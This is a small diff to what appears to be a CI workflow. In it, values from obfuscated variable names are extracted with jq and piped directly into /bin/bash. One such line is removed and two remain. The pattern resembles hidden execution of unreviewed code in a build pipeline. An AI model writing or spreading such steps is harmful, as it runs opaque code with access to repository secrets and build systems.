@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$ybvi358" | jq -r .rjzw91 | /bin/bash
           echo $ptko231 | jq -r .ztn872 | /bin/bash
-          printf '%s' "$q73216" | jq -r .ium002 | /bin/bash
 
       - name: Archive output
         if: always()
